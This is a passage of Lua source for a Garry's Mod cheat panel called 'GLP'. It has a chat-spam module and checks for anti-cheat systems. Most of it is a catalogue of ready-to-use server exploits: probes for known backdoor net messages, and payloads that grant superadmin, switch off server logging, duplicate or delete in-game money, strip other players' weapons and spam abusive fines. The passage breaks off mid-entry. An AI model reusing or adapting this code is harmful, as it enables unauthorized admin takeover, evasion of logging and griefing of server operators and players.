		if string.find(string.lower(text), "hac") or string.find(string.lower(text), "h4c") or string.find(string.lower(text), "h@c") or string.find(string.lower(text), "hak") or string.find(string.lower(text), "h4k") or string.find(string.lower(text), "h@k") or string.find(string.lower(text), "hec") or string.find(string.lower(text), "h3c") or string.find(string.lower(text), "hek") or string.find(string.lower(text), "h3k") or string.find(string.lower(text), "hax") or string.find(string.lower(text), "h4x") or string.find(string.lower(text), "h@x") or string.find(string.lower(text), "hex") or string.find(string.lower(text), "h3x") or string.find(string.lower(text), "hask") or string.find(string.lower(text), "h4sk") or string.find(string.lower(text), "h@sk") or string.find(string.lower(text), "ha$k") or string.find(string.lower(text), "h4$k") or string.find(string.lower(text), "h@$k") or string.find(string.lower(text), "hasc") or string.find(string.lower(text), "h4sc") or string.find(string.lower(text), "h@sc") or string.find(string.lower(text), "ha$c") or string.find(string.lower(text), "h4$c") or string.find(string.lower(text), "h@$c") or string.find(string.lower(text), "cheat") or string.find(string.lower(text), "ch3at") or string.find(string.lower(text), "che4t") or string.find(string.lower(text), "che@t") or string.find(string.lower(text), "ch34t") or string.find(string.lower(text), "ch3@t") or string.find(string.lower(text), "chet") or string.find(string.lower(text), "ch3t") or string.find(string.lower(text), "chit") or string.find(string.lower(text), "ch1t") or string.find(string.lower(text), "wal") or string.find(string.lower(text), "w4l") or string.find(string.lower(text), "w@l") or string.find(string.lower(text), "wa1") or string.find(string.lower(text), "w@1") or string.find(string.lower(text), "w41") or string.find(string.lower(text), "aim") or string.find(string.lower(text), "a1m") or string.find(string.lower(text), "4im") or string.find(string.lower(text), "@im") or string.find(string.lower(text), "@1m") or string.find(string.lower(text), "41m") or string.find(string.lower(text), "trig") or string.find(string.lower(text), "tr1g") or string.find(string.lower(text), "spin") or string.find(string.lower(text), "sp1n") or string.find(string.lower(text), "legit") or string.find(string.lower(text), "leg1t") or string.find(string.lower(text), "rage") or string.find(string.lower(text), "r4ge") or string.find(string.lower(text), "r@ge") or string.find(string.lower(text), "rag3") or string.find(string.lower(text), "r@g3") or string.find(string.lower(text), "r4g3") or string.find(string.lower(text), "bot") or string.find(string.lower(text), "b0t") or string.find(string.lower(text), "FakeAngles") or string.find(string.lower(text), "3sp") or string.find(string.lower(text), "e$p") or string.find(string.lower(text), "3$p") or string.find(string.lower(text), "lua") or string.find(string.lower(text), "1ua") or string.find(string.lower(text), "lu4") or string.find(string.lower(text), "lu@") or string.find(string.lower(text), "1u4") or string.find(string.lower(text), "1u@") or string.find(string.lower(text), "scr") or string.find(string.lower(text), "skr") or string.find(string.lower(text), "$cr") or string.find(string.lower(text), "$kr") or string.find(string.lower(text), "skid") or string.find(string.lower(text), "sk1d") or string.find(string.lower(text), "$kid") or string.find(string.lower(text), "$k1d") or string.find(string.lower(text), "bunny") or string.find(string.lower(text), "buny") or string.find(string.lower(text), "h0p") or string.find(string.lower(text), "hop") or string.find(string.lower(text), "aa") or string.find(string.lower(text), "anti") or string.find(string.lower(text), "4nti") or string.find(string.lower(text), "@nti") or string.find(string.lower(text), "ant1") or string.find(string.lower(text), "@nt1") or string.find(string.lower(text), "4nt1") or string.find(string.lower(text), "GLPBot") or string.find(string.lower(text), "idi0t") or string.find(string.lower(text), "1diot") or string.find(string.lower(text), "id1ot") or string.find(string.lower(text), "1di0t") or string.find(string.lower(text), "id10t") or string.find(string.lower(text), "1d10t") or string.find(string.lower(text), "paste") or string.find(string.lower(text), "p4ste") or string.find(string.lower(text), "p@ste") or string.find(string.lower(text), "past3") or string.find(string.lower(text), "p@st3") or string.find(string.lower(text), "p4st3") or string.find(string.lower(text), "box") or string.find(string.lower(text), "b0x") or string.find(string.lower(text), "blo") or string.find(string.lower(text), "bl0") or string.find(string.lower(text), "b1o") or string.find(string.lower(text), "b10") or string.find(string.lower(text), "ware") or string.find(string.lower(text), "w4re") or string.find(string.lower(text), "w@re") or string.find(string.lower(text), "war3") or string.find(string.lower(text), "w@r3") or string.find(string.lower(text), "w4r3") or string.find(string.lower(text), "meth") or string.find(string.lower(text), "m3th") or string.find(string.lower(text), "kick") or string.find(string.lower(text), "k1ck") or string.find(string.lower(text), "kik") or string.find(string.lower(text), "k1k") or string.find(string.lower(text), "ban") or string.find(string.lower(text), "b4n") or string.find(string.lower(text), "b@n") or string.find(string.lower(text), "fake") or string.find(string.lower(text), "f4ke") or string.find(string.lower(text), "f@ke") or string.find(string.lower(text), "fak3") or string.find(string.lower(text), "f4k3") or string.find(string.lower(text), "f@k3") then
	if engine.ActiveGamemode() == "darkrp" then
	ChatClear.OOC()
	else
	ChatClear.Run()
	end
	end
	end
	if gConn("Extra", "Chat", "Enable Spams") and gOption("Extra", "Chat", "Reply Spam:") == "Copy Messages" and pm.GetFriendStatus(v) ~= "friend" then
	if (v ~= ply) then
	if (team) then
	ply:ConCommand("say_team '" .. text .. "' - " .. v:Nick())
	else
	ply:ConCommand("say '" .. text .. "' - " .. v:Nick())
	end
	end
	end
	if gConn("Extra", "Chat", "Enable Spams") and gOption("Extra", "Chat", "Reply Spam:") ~= "Off" and pm.GetFriendStatus(v) ~= "friend" then
	if (v ~= ply) then
	if (team && gOption("Extra", "Chat", "Reply Spam:") == "Random") then
		RunConsoleCommand("say_team", randomrFakeAnglesonse[math.random(#randomrFakeAnglesonse)])
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "Random") then
		RunConsoleCommand("say", randomrFakeAnglesonse[math.random(#randomrFakeAnglesonse)])
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "shut up") then
		RunConsoleCommand("say_team", "shut up")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "shut up") then
		RunConsoleCommand("say", "shut up")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "ok") then
		RunConsoleCommand("say_team", "ok")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "ok") then
		RunConsoleCommand("say", "ok")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "who") then
		RunConsoleCommand("say_team", "who")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "who") then
		RunConsoleCommand("say", "who")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "nobody cares") then
		RunConsoleCommand("say_team", "nobody cares")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "nobody cares") then
		RunConsoleCommand("say", "nobody cares")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "where") then
		RunConsoleCommand("say_team", "where")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "where") then
		RunConsoleCommand("say", "where")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "lol stop spamming") then
		RunConsoleCommand("say_team", "lol stop spamming")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "lol stop spamming") then
		RunConsoleCommand("say", "lol stop spamming")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "what") then
		RunConsoleCommand("say_team", "what")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "what") then
		RunConsoleCommand("say", "what")
		elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "yea") then
		RunConsoleCommand("say_team", "yea")
		elseif (gOption("Extra", "Chat", "Reply Spam:") == "yea") then
		RunConsoleCommand("say", "yea")
elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "lol") then
RunConsoleCommand("say_team", "lol")
elseif (gOption("Extra", "Chat", "Reply Spam:") == "lol") then
	RunConsoleCommand("say", "lol")
	elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "FUNNY") then
	RunConsoleCommand("say_team", "FUNNY")
elseif (gOption("Extra", "Chat", "Reply Spam:") == "FUNNY") then
RunConsoleCommand("say", "FUNNY")
elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "shit") then
RunConsoleCommand("say_team", "SHOT")
elseif (gOption("Extra", "Chat", "Reply Spam:") == "SHOT") then
RunConsoleCommand("say", "SHOT")
elseif (team && gOption("Extra", "Chat", "Reply Spam:") == "fooy") then
RunConsoleCommand("say_team", "fuck")
elseif (gOption("Extra", "Chat", "Reply Spam:") == "fooy") then
RunConsoleCommand("say", "fooy")
end
end
end
end)

chat.AddText(Color(203, 48, 48, 255), "Attention! GLP PANEL ONLINE")
chat.AddText(Color(255, 255, 255, 255), "www.lmccoding.weebly.com")

if (_G.QAC or _G.qac or _G.CAC or _G.cac or _G.SAC or _G.sac or _G.DAC or _G.dac or _G.TAC or _G.tac or _G.simplicity or _G.SMAC or _G.smac or _G.MAC or _G.mac or _G.GAC or _G.gac or _G.GS or _G.gs or _G.AE or _G.ae or _G.CardinalLib) then
timer.Create("ChatPrint", 5.7, 1, function() MsgR(5.2, "GLP Menu Found a AntiCheat on this Server becareful") end)
timer.Create("PlaySound", 5.7, 1, function() surface.PlaySound("npc/fast_zombie/fz_frenzy1.wav") end)
ac = true
return
end
end)

local ulxflood = false
local netKey = ""
local GlItCh = nil
if ulx then ulx.showMotdMenu = function() end end
local DGE = {}
DGE.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
surface.CreateFont("HUDLogo2",{size = 28, weight = 100, antialias = 0})
function anticheats()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.Menu:Remove()
RunConsoleCommand( "GLP_anticheats")
end
function gui.url()
surface.PlaySound("garrysmod/ui_click.wav")
gui.OpenURL( "BLANK URL NONE" )
end
function DGE.ChatText( str )
ctext( Color(190, 190, 190), [[ [GlItChSystems v3.1.1]: ]]..str )
end
function DGE.NetStart( str )
local netstart = net.Start
if GlItCh and GlItCh.G and GlItCh.G.net then
netstart = GlItCh.G.net.Start
else
--        print( "sending netmessage in insecure mode" )
end
return netstart( str )
end
function DGE.ValidNetString( str )
local netstart = net.Start
if GlItCh and GlItCh.G and GlItCh.G.net then
netstart = GlItCh.G.net.Start
else
--        print( "scanning for exploit in insecure mode" )
end
local status, error = pcall( netstart, str )
return status
end
function DGE.ValidNetString( str )
local status, error = pcall( net.Start, str )
return status
end
DGE.sploits = {}
local severitycols = { -- The color of strokes of the exploits (Their "Importance")
[1337] = Color( 255, 0, 0 ),
[1] = Color( 0, 255, 53 ),
[2] = Color( 176, 255, 0 ),
[3] = Color( 255, 150, 0 ),
[4] = Color( 255, 0, 0 ),
}
function DGE.AddExploit( name, tab ) -- EXPLOIT, AIGHT
if !isstring( name ) then print("U MESSED UP A EXPLOIT") return end
if !istable( tab ) then print("U MESSED UP A EXPLOIT") return end
DGE.sploits[name] = tab
end
function DGE.IsStored( addr )
return DGE.memory[addr] != nil
end
function DGE.GetStored( addr, fallback )
if fallback and DGE.memory[addr] == nil then return fallback end
return DGE.memory[addr]
end
function DGE.Store( addr, val )
DGE.memory[addr] = val
end
function DGE.GetAllStored()
return DGE.memory
end
function DGE.GetAllStoredData()
local ret = {}
for k, v in pairs( DGE.memory ) do
if !istable( v ) then ret[k] = v end
end
return ret
end
spoofchat = 0
local ulxflood = false
local netKey = ""
local Defqon = nil 
if ulx then ulx.showMotdMenu = function() end end
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
surface.CreateFont("HUDLogo2",{size = 35, weight = 100, antialias = 0})
timer.Create("timerversionchecker2",99999999999999999999999999999999,1,function()
hook.Remove("HUDPaint2", "HudVersionChecker")
end)
hook.Add("HUDPaint2", "HudVersionChecker", function()
draw.SimpleTextOutlined( "Thanks For Using GLP Free..."..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", www.lmccoding.weebly.com", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 15, ScrH()/30, Color(255, 0, 0, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)
function playSound(url)
    sound.PlayURL(url, '', function( station ) 

        if ( IsValid( station ) ) then

        station:SetPos( LocalPlayer():GetPos() )
        station:Play()

        end
    end)

end
DGE.AddExploit( "Spoof Chat Icon", {
desc = "Not a serious exploit, just a fun one. Removes the typing icon",
severity = 1337,
scan = function() return DGE.ValidNetString( "TalkIconChat" ) end,
functions = {
{ typ = "func", name = "Spoof", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if spoofchat == 0 then
hook.Remove('StartChat', 'TalkIcon')
DGE.NetStart("TalkIconChat")
net.WriteBool(true)
net.SendToServer()
spoofchat = 1
DGE.ChatText("Icon Spoofer included")
else
DGE.NetStart("TalkIconChat")
net.WriteBool(false)
net.SendToServer()
DGE.ChatText("Icon Spoofer is off")
spoofchat = 0
end
end }
}
}
)
DGE.AddExploit( "Give physgun", {
desc = "Getting Physgun",
severity = 1,
scan = function() return DGE.ValidNetString( "BuyFirstTovar" ) end,
functions = {
{ typ = "func", name = "Receive", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("BuyFirstTovar")
net.WriteString("0")
net.SendToServer()
DGE.ChatText("Physgun obtained")
end }
}
}
)
DGE.AddExploit( "Give gravity gun", {
desc = "Getting Gravitated by the Planet",
severity = 1,
scan = function() return DGE.ValidNetString( "BuySecondTovar" ) end,
functions = {
{ typ = "func", name = "Receive", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("BuySecondTovar")
net.WriteString("0")
net.SendToServer()
DGE.ChatText("Gravity gun obtained")
end }
}
}
)
DGE.AddExploit( "Auto-Heal", {
desc = "Exploit for automatic treatment",
severity = 1,
scan = function() return DGE.ValidNetString( "GiveHealthNPC" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if not autoheal_enable then
DGE.ChatText("AutoHeal")
hook.Add("Think", "RE.CheckHealt", function()
if LocalPlayer():Health() < 100 then
DGE.NetStart("GiveHealthNPC")
net.WriteString("100")
net.SendToServer()
end
end)
autoheal_enable = true
else
DGE.ChatText("AutoHeal - Off")
hook.Remove("Think", "RE.CheckHealt")
autoheal_enable = false
end
end }
}
}
)
DGE.AddExploit( "TestPromoCode", {
desc = "something with comps, хz",
severity = 1,
scan = function() return DGE.ValidNetString( "PCAdd" ) end,
functions = {
{ typ = "func", name = "Start", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart( "PCAdd" )
net.WriteString("alahman")
net.WriteString("300000000")
net.SendToServer()
timer.Simple(3,function()
DGE.NetStart("ActivatePC")
net.WriteString("alahman")
net.SendToServer()
DGE.NetStart("PCDelAll")
net.SendToServer()
end
)
end}
}
}
)

DGE.AddExploit( "Toggle TTT Report Bypass", {
desc = "TTT Report Bypass",
severity = 1,
scan = function() return isttt end,
functions = {
{ typ = "func", name = "Toggle", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if bypass == 0 then
                hook.Add("Think", "remove_ttt_report", function()
                    local pan = vgui.GetHoveredPanel()
                    CheckChild(pan)
                end)
 
                DGE.ChatText("Report Bypass включен")
                bypass = 1
            else
                hook.Remove("Think", "remove_ttt_report")
                DGE.ChatText("Report Bypass Off")
                bypass = 0
end
end }
}
}
)
 
DGE.AddExploit( "☢ PatchPlay Give Superadmin ☢", {
desc = "Issue super admin (need a reboot to the server!)",
severity = 1,
scan = function() return DGE.ValidNetString( "pplay_deleterow" ) end,
functions = {
{ typ = "players", addr = "l_superadmins" },
{ typ = "func", name = "Launch", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "l_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
local tbl = {}
tbl.name = "FAdmin_PlayerGroup"
tbl.where = {
"steamid",
tostring(id)
}
DGE.NetStart("pplay_deleterow")
net.WriteTable(tbl)
net.SendToServer()
local tbl = {}
tbl.tblname = "FAdmin_PlayerGroup"
tbl.tblinfo = {
tostring(id),
"superadmin"
}
DGE.NetStart("pplay_addrow")
net.WriteTable(tbl)
net.SendToServer()
DGE.ChatText( "Super admin issued"..v:Nick() )
end
end, },
},
} )
local exploitent = ""
if DGE.ValidNetString( "Sandbox_ArmDupe" ) then
exploitent = "Sandbox_ArmDupe"
else
if DGE.ValidNetString( "fijiconn" ) then
exploitent = "fijiconn"
else
if DGE.ValidNetString( "Sbox_darkrp" ) then
exploitent = "Sbox_darkrp"
else
if DGE.ValidNetString( "Sbox_itemstore" ) then
exploitent = "Sbox_itemstore"
else
if DGE.ValidNetString( "Ulib_Message" ) then
exploitent = "Ulib_Message"
else
if DGE.ValidNetString( "ULogs_Info" ) then
exploitent = "ULogs_Info"
else
if DGE.ValidNetString( "ITEM" ) then
exploitent = "ITEM"
else
if DGE.ValidNetString( "fix" ) then
exploitent = "fix"
else
if DGE.ValidNetString( "Fix_Keypads" ) then
exploitent = "Fix_Keypads"
else
if DGE.ValidNetString( "Remove_Exploiters" ) then
exploitent = "Remove_Exploiters"
else
if DGE.ValidNetString( "noclipcloakaesp_chat_text" ) then
exploitent = "noclipcloakaesp_chat_text"
else
if DGE.ValidNetString( "_GlItCh" ) then
exploitent = "_GlItCh"
else
if DGE.ValidNetString( "_CAC_ReadMemory" ) then
exploitent = "_CAC_ReadMemory"
else
if DGE.ValidNetString( "nostrip" ) then
exploitent = "nostrip"
else
if DGE.ValidNetString( "nocheat" ) then
exploitent = "nocheat"
else
if DGE.ValidNetString( "LickMeOut" ) then
exploitent = "LickMeOut"
else
if DGE.ValidNetString( "ULX_QUERY2" ) then
exploitent = "ULX_QUERY2"
else
if DGE.ValidNetString( "ULXQUERY2" ) then
exploitent = "ULXQUERY2"
else
if DGE.ValidNetString( "MoonMan" ) then
exploitent = "MoonMan"
else
if DGE.ValidNetString( "Im_SOCool" ) then
exploitent = "Im_SOCool"
else
if DGE.ValidNetString( "Sandbox_GayParty" ) then
exploitent = "Sandbox_GayParty"
else
if DGE.ValidNetString( "DarkRP_UTF8" ) then
exploitent = "DarkRP_UTF8"
else
if DGE.ValidNetString( "oldNetReadData" ) then
exploitent = "oldNetReadData"
else
if DGE.ValidNetString( "memeDoor" ) then
exploitent = "memeDoor"
else
if DGE.ValidNetString( "BackDoor" ) then
exploitent = "BackDoor"
else
if DGE.ValidNetString( "OdiumBackDoor" ) then
exploitent = "OdiumBackDoor"
else
if DGE.ValidNetString( "SessionBackdoor" ) then
exploitent = "SessionBackdoor"
else
if DGE.ValidNetString( "DarkRP_AdminWeapons" ) then
exploitent = "DarkRP_AdminWeapons"
else
if DGE.ValidNetString( "cucked" ) then
exploitent = "cucked"
else
if DGE.ValidNetString( "NoNerks" ) then
exploitent = "NoNerks"
else
if DGE.ValidNetString( "kek" ) then
exploitent = "kek"
else
if DGE.ValidNetString( "ZimbaBackDoor" ) then
exploitent = "ZimbaBackDoor"
else
if DGE.ValidNetString( "something" ) then
exploitent = "something"
else
if DGE.ValidNetString( "random" ) then
exploitent = "random"
else
if DGE.ValidNetString( "strip0" ) then
exploitent = "strip0"
else
if DGE.ValidNetString( "fellosnake" ) then
exploitent = "fellosnake"
else
if DGE.ValidNetString( "enablevac" ) then
exploitent = "enablevac"
else
if DGE.ValidNetString( "idk" ) then
exploitent = "idk"
else
if DGE.ValidNetString( "c" ) then
exploitent = "c"
else
if DGE.ValidNetString( "killserver" ) then
exploitent = "killserver"
else
if DGE.ValidNetString( "fuckserver" ) then
exploitent = "fuckserver"
else
if DGE.ValidNetString( "cvaraccess" ) then
exploitent = "cvaraccess"
else
if DGE.ValidNetString( "rcon" ) then
exploitent = "rcon"
else
if DGE.ValidNetString( "rconadmin" ) then
exploitent = "rconadmin"
else
if DGE.ValidNetString( "web" ) then
exploitent = "web"
else
if DGE.ValidNetString( "jesuslebg" ) then
exploitent = "jesuslebg"
else
if DGE.ValidNetString( "zilnix" ) then
exploitent = "zilnix"
else
if DGE.ValidNetString( "Þà?D)◘" ) then
exploitent = "Þà?D)◘"
else
if DGE.ValidNetString( "disablebackdoor" ) then
exploitent = "disablebackdoor"
else
if DGE.ValidNetString( "kill" ) then
exploitent = "kill"
else
if DGE.ValidNetString( "GlItChBackdoor" ) then
exploitent = "GlItChBackdoor"
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
end
DGE.AddExploit( ".NET Backdoor", {
desc = "Found .net backdoor: "..exploitent.."",
severity = 1,
scan = function() return DGE.ValidNetString( exploitent ) end,
functions = {
{ typ = "func", name = "Disable logs", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart(exploitent)
net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
net.WriteBit(1)
net.SendToServer()
end, },
{ typ = "htxcommandeliste", name = "FREE GLP Exploits" },
{ typ = "soundboard", name = "Sounds/Songs" },
{ typ = "players", addr = "give_superadmins" },
{ typ = "func", name = "SetUserGroup", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "give_superadmins", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local id = v:SteamID()
DGE.NetStart(exploitent)
net.WriteString( "ulx adduserid "..id.." superadmin" )
net.WriteBit(false)
net.SendToServer()
end
end, },
{ typ = "func", name = "Spam send Fine", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "spamamandefine" ) then
DGE.ChatText( "Start spam" )
timer.Create( "spamamandefine", 0.1, 0, function()
local t = DGE.GetStored( "l_players_listing_fine", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
DGE.NetStart("RP_Fine_Player")
net.WriteString(v:Nick())
net.WriteString(v:Nick())
net.WriteDouble(DGE.GetStored( "montant_argent11" ))
net.WriteString("This server deserves anarchy! Server hacked !! You can lick my asshole now")
net.SendToServer()
end
end)
else
timer.Remove( "spamamandefine" )
DGE.ChatText( "Off ..." )
end
end, },
},
} )
DGE.AddExploit( "€ 3D Cardealer €", {
desc = "Exploit for money. Look at the purchased car to duplicate it. ;)",
severity = 2,
scan = function() return DGE.ValidNetString( "RXCAR_Shop_Store_C2S" ) end,
functions = {
{ typ = "func", name = "Duplicate", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for i = 0, 75 do
DGE.NetStart( "RXCAR_Shop_Store_C2S" );
net.WriteTable( { E = ent } );
net.SendToServer();
end
end, },
{ typ = "func", name = "Sell everything", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local ent
for k,v in pairs(ents.GetAll()) do
if v:GetClass() == "rm_car_dealer" then
ent = v
end
end
for k,v in pairs(RX3DCar_Inventory) do
DGE.NetStart( "RXCAR_SellINVCar_C2S" )
net.WriteTable({UN=v.UniqueID,SE=ent})
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "Remove Weapons / Money", {
desc = "Remove weapons / money from everyone",
severity = 5,
scan = function() return DGE.ValidNetString( "drugseffect_remove" ) end,
functions = {
{ typ = "func", name = "Remove weapon", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("drugseffect_remove")
net.SendToServer()
end, },
{ typ = "func", name = "Delete money", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("drugs_money")
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "€ Crafting Mod €", {
desc = "Exploit on the money",
severity = 3,
scan = function() return DGE.ValidNetString( "CRAFTINGMOD_SHOP" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent14" },
{ typ = "func", name = "Add money", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   -DGE.GetStored( "montant_argent14" );
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
{ typ = "func", name = "Delete money", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("CRAFTINGMOD_SHOP")
net.WriteTable({
BUY =   LocalPlayer():getDarkRPVar("money");
type    =   1
})
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "Hack Keypads", {
desc = "Hack all Keypads",
severity = 1,
scan = function() return DGE.ValidNetString( "start_wd_emp" ) end,
functions = {
{ typ = "func", name = "Hack", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("start_wd_emp")
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "€ Kart System €", {
desc = "Exploit for money.",
severity = 3,
scan = function() return DGE.ValidNetString( "kart_sell" ) end,
functions = {
{ typ = "func", name = "Run", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for i=1, 300 do
DGE.NetStart("kart_sell")
net.WriteString("sw_gokart")
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "€ Farming Mod €", {
desc = "Exploit for money, buy different things;)",
severity = 3,
scan = function() return DGE.ValidNetString( "FarmingmodSellItems" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Receive", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   DGE.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "€ Point Shop €", {
desc = "Exploit for money, buy whores and coke;)",
severity = 3,
scan = function() return DGE.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Run", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
DGE.NetStart("ClickerAddToPoints")
net.WriteInt(DGE.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
DGE.AddExploit( "Body Groups", {
desc = "Changing skin",
severity = 1,
scan = function() return DGE.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Change", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
DGE.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
DGE.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
DGE.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
DGE.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
DGE.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
DGE.AddExploit( "€ Hitman X €", {
desc = "Exploit on the money",
severity = 3,
scan = function() return DGE.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Give", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
DGE.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -DGE.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Pick up", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove( "HUDPaint", "skhdsakjl")
local t = DGE.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
DGE.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( DGE.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "€ Bail Out €", {
desc = "Exploit on the money",
severity = 3,
scan = function() return DGE.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Amount", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Give", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
DGE.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -DGE.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Pick up", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = DGE.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
DGE.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( DGE.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
DGE.AddExploit( "€ Tow Truck €", {
desc = "I couldn't translate that.",
severity = 2,
